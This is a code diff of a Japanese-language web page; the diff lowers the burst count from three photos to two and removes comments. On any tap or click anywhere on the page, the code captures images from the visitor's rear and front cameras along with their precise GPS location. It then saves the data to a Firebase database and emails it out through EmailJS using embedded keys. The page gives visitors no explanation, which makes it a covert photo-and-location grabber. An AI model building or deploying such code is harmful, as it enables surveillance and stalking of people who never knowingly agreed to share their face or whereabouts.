@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Firestore & EmailJS 連写＋位置情報送信</title>
+<title>Firestore保存＋EmailJS送信（2枚ずつ連写）</title>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -21,22 +21,12 @@
     font-family: monospace;
     margin-bottom: 20px;
   }
-  .photo-preview img {
-    width: 120px;
-    margin: 5px;
-    border: 2px solid #555;
-    border-radius: 4px;
-  }
-  h1 {
-    text-align:center;
-  }
 </style>
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js";
   import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-firestore.js";
 
-  // Firebase設定
   const firebaseConfig = {
     apiKey: "AIzaSyDgwbExA5BKTcKsq2Ov8z173Ke6EPYGf28",
     authDomain: "picture-storage-906ae.firebaseapp.com",
@@ -49,10 +39,8 @@
   const app = initializeApp(firebaseConfig);
   const db = getFirestore(app);
 
-  // EmailJS初期化
   emailjs.init("cPjKBUm_i6HebDQF7");
 
-  // DOM要素
   const statusEl = document.getElementById("status");
 
   let busy = false;
@@ -63,7 +51,6 @@
     statusEl.scrollTop = statusEl.scrollHeight;
   }
 
-  // カメラ起動→連写（3枚、0.05秒間隔）
   async function capturePhotos(facingMode) {
     log(`📸 ${facingMode}カメラ起動`);
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
@@ -79,7 +66,7 @@
     const ctx = canvas.getContext("2d");
 
     const photos = [];
-    for (let i = 0; i < 3; i++) {
+    for (let i = 0; i < 2; i++) {  // ← ここを3から2に変更
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const dataUrl = canvas.toDataURL("image/jpeg", 0.3);
       photos.push(dataUrl);
@@ -91,7 +78,6 @@
     return photos;
   }
 
-  // 位置情報取得
   function getLocation() {
     log("📍 位置情報取得開始");
     return new Promise((resolve, reject) => {
@@ -115,7 +101,6 @@
     });
   }
 
-  // Firestoreに保存
   async function saveToFirestore(data) {
     log("⬆️ Firestoreに保存中...");
     try {
@@ -126,7 +111,6 @@
     }
   }
 
-  // EmailJS送信
   async function sendEmail(data) {
     log("✉️ EmailJS送信中...");
     try {
@@ -137,7 +121,6 @@
     }
   }
 
-  // メイン処理
   async function runProcess() {
     if(busy) {
       log("❌ 処理中です。二重実行防止");
@@ -147,14 +130,10 @@
     log("🔄 処理開始");
 
     try {
-      // 外カメ連写
       const rearPhotos = await capturePhotos("environment");
-      // 内カメ連写
       const frontPhotos = await capturePhotos("user");
-      // 位置情報取得
       const location = await getLocation();
 
-      // Firestore用オブジェクト作成
       const firestoreData = {
         rearPhotos,
         frontPhotos,
@@ -163,14 +142,14 @@
       };
       await saveToFirestore(firestoreData);
 
-      // EmailJS用テンプレートパラメータ整形
+      // EmailJS送信用データも2枚ずつに対応
       const templateParams = {
         photo_rear1: rearPhotos[0],
         photo_rear2: rearPhotos[1],
-        photo_rear3: rearPhotos[2],
+        // photo_rear3: "",  // 3枚目は無いのでコメントアウト
         photo_front1: frontPhotos[0],
         photo_front2: frontPhotos[1],
-        photo_front3: frontPhotos[2],
+        // photo_front3: "", // 同上
         location_info: `緯度: ${location.lat}<br>経度: ${location.lon}<br>精度: ${location.acc}m<br>時刻: ${location.time}`,
         date: new Date().toLocaleString()
       };
@@ -184,13 +163,12 @@
     }
   }
 
-  // ページ全体クリック・タッチで処理実行
   window.addEventListener("click", runProcess);
   window.addEventListener("touchstart", runProcess, { passive: false });
 </script>
 </head>
 <body>
-<h1>📸 Firestore保存＋EmailJS送信</h1>
+<h1>📸 Firestore保存＋EmailJS送信（2枚ずつ連写）</h1>
 <pre id="status">待機中...</pre>
 </body>
 </html>
